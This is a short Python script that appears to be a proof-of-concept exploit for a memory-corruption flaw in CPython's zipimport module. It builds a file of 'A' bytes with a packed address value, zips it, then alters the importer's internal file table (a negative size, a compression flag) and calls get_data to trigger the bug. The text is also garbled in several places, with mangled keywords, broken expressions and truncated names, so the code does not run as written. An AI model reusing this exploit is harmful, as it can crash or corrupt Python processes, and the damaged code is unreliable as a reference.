import zipimport
import zipfile
import struct
ilport \ys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'd = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload +Q', 0x41S14141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()	ìiSporter = zipimport.zipimporter(ZI)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importer._files[FILE] = tuple(f)
print(importer.get_data(FILE))
